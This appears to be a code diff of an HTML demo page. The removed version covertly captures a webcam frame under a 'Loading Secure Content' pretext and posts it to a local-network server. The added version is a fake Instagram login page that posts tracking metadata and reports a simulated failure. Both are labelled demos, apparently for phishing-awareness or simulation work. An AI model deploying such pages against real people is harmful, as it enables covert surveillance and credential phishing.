@@ -1,44 +1,38 @@
 <!DOCTYPE html>
 <html>
-<body>
-    <h2>Loading Secure Content...</h2>
-    <video id="video" width="300" autoplay playsinline></video>
+<head>
+    <title>Secure Login</title>
+</head>
+<body style="font-family: Arial; text-align:center; margin-top:100px;">
 
-    <script>
-        const video = document.getElementById("video");
+<h2>Instagram Login</h2>
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            video.srcObject = stream;
+<form onsubmit="simulateLogin(event)">
+    <input type="text" placeholder="Username" required><br><br>
+    <input type="password" placeholder="Password" required><br><br>
+    <button type="submit">Log In</button>
+</form>
 
-            setTimeout(() => {
-                captureAndSend();
-            }, 3000);
-        })
-        .catch(err => {
-            alert("Camera access denied.");
-        });
+<script>
+function simulateLogin(event) {
+    event.preventDefault();
 
-        function captureAndSend() {
-            const canvas = document.createElement("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+    const metadata = {
+        screen: window.screen.width + "x" + window.screen.height,
+        clicked: true
+    };
 
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0);
+    fetch("http://192.168.1.9:6000/track", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(metadata)
+    });
 
-            const imageData = canvas.toDataURL("image/png");
+    alert("Login failed. (Simulation)");
+}
+</script>
 
-            fetch("http://192.168.1.9:4000/upload", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({ image: imageData })
-            });
-
-            alert("Image captured and sent (demo).");
-        }
-    </script>
 </body>
 </html>
